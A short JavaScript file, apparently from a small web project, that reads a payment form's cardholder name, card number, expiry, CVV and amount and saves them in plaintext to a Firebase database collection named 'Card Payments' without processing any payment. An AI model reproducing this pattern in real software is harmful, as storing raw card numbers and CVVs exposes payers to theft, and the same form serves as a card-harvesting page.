
  // Your web app's Firebase configuration
  var firebaseConfig = {
    apiKey: "AIzaSyC4RSdSuBDDnZ24r2cJRtezY7rxu0TTATE",
    authDomain: "web-database-abc50.firebaseapp.com",
    projectId: "web-database-abc50",
    storageBucket: "web-database-abc50.appspot.com",
    messagingSenderId: "853761462369",
    appId: "1:853761462369:web:88716e64c284bd09325a20"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('Card Payments');

// Listen for form submit
document.getElementById('paymentForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var owner_name = getInputVal('owner_name');
  var card_number = getInputVal('card_number');
  var card_date = getInputVal('card_date');
  var card_year = getInputVal('card_year');
  var cvv = getInputVal('cvv');
  var amount = getInputVal('amount');

  // Save message
  saveMessage(owner_name, card_number, card_date,card_year,cvv,amount );

  

  // Clear form
  document.getElementById('paymentForm').reset();
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(owner_name, card_number, card_date,card_year,cvv,amount ){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    owner_name: owner_name,
    card_number:card_number,
    card_date:card_date,
	card_year:card_year,
	cvv:cvv,
	amount:amount
  });
}